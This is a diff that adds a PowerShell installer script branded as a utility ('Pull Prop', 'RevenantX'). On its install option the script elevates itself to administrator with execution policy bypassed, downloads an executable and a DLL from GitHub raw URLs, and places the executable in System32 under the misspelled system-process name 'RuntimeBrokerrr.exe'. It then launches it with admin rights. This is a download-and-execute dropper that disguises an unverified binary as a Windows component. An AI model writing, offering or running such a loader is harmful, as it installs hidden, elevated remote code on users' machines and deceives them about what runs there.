@@ -1,0 +1,114 @@
+# ==========================================================
+# 💀 XXXX CMD Utility | Version: 29/10/2025
+# ==========================================================
+
+# -----------------------------
+# Menu Selection
+# -----------------------------
+Write-Host ""
+Write-Host "             WELCOME TO PULL PROP            " -ForegroundColor Cyan
+Write-Host "              © 2025 | PIGGY PROJECT               " -ForegroundColor Gray
+Write-Host ""
+Write-Host " [1] Install & Run" -ForegroundColor Green
+Write-Host " [2] Clean" -ForegroundColor Yellow
+Write-Host ""
+$choice = Read-Host ">>> Enter your choice (1/2)"
+
+# -----------------------------
+# Check for Administrator Rights
+# -----------------------------
+if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { 
+    Write-Host "`n[⚙] Restarting with Administrator privileges..." -ForegroundColor Cyan
+    Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
+    exit
+}
+
+# -----------------------------
+# Define Paths & Variables
+# -----------------------------
+$system32Path = "$env:windir\System32"
+$exeDestination = Join-Path $system32Path "RuntimeBrokerrr.exe"
+$dllDestination = Join-Path $system32Path "Guna.UI2.dll"
+
+$exeUrl = "https://github.com/ORRYxyz/cccc/raw/main/pu.exe"
+$dllUrl = "https://github.com/NAWINNNNNNNNNNNNNNNNNNNNNNNNNNN/WEBSEA1213/raw/refs/heads/main/Guna.UI2.dll"
+
+# -----------------------------
+# Install & Run Mode
+# -----------------------------
+if ($choice -eq "1") {
+    Write-Host "`n[🚀] Starting Installation..." -ForegroundColor Cyan
+    Start-Sleep -Seconds 1
+
+    # Download DLL
+    Write-Host "[↓] Downloading Guna.UI2.dll..."
+    try {
+        Invoke-WebRequest -Uri $dllUrl -OutFile $dllDestination -UseBasicParsing
+        Write-Host "[✔] Guna.UI2.dll download completed." -ForegroundColor Green
+    } catch {
+        Write-Host "[✖] Guna.UI2.dll download failed: $_" -ForegroundColor Red
+        exit
+    }
+
+    # Download EXE
+    Write-Host "[↓] Downloading main executable..."
+    try {
+        $tempFile = Join-Path $env:TEMP "revenantx_temp.exe"
+        Invoke-WebRequest -Uri $exeUrl -OutFile $tempFile -UseBasicParsing
+        Move-Item -Path $tempFile -Destination $exeDestination -Force
+        Write-Host "[✔] Executable download completed." -ForegroundColor Green
+    } catch {
+        Write-Host "[✖] Executable download failed: $_" -ForegroundColor Red
+        exit
+    }
+
+    # Run program
+    Write-Host "[⚡] Launching program..." -ForegroundColor Cyan
+    try {
+        Start-Process -FilePath $exeDestination -Verb RunAs
+        Write-Host "[✔] Program started successfully." -ForegroundColor Green
+    } catch {
+        Write-Host "[✖] Failed to start program: $_" -ForegroundColor Red
+    }
+
+    Write-Host "`n[✅] Installation completed successfully!" -ForegroundColor Green
+}
+
+# -----------------------------
+# Clean Mode
+# -----------------------------
+elseif ($choice -eq "2") {
+    Write-Host "`n[🧹] Cleaning up installation..." -ForegroundColor Yellow
+
+    # Stop process
+    Write-Host "[⚙] Stopping RuntimeBrokerrr.exe process..."
+    try {
+        Stop-Process -Name "RuntimeBrokerrr" -Force -ErrorAction SilentlyContinue
+        Write-Host "[✔] Process stopped." -ForegroundColor Green
+    } catch {
+        Write-Host "[⚠] No running process found or failed to stop." -ForegroundColor DarkYellow
+    }
+
+    # Remove files
+    if (Test-Path $exeDestination) { 
+        Remove-Item $exeDestination -Force 
+        Write-Host "[🗑] Removed executable: RuntimeBrokerrr.exe" -ForegroundColor Green
+    }
+    if (Test-Path $dllDestination) { 
+        Remove-Item $dllDestination -Force 
+        Write-Host "[🗑] Removed DLL: Guna.UI2.dll" -ForegroundColor Green
+    }
+
+    Write-Host "`n[✅] Cleanup completed successfully!" -ForegroundColor Green
+}
+
+# -----------------------------
+# Invalid Choice
+# -----------------------------
+else {
+    Write-Host "`n[✖] Invalid selection. Please choose 1 or 2." -ForegroundColor Red
+}
+
+# ==========================================================
+# End of Script | RevenantX Project © 2025
+# ==========================================================
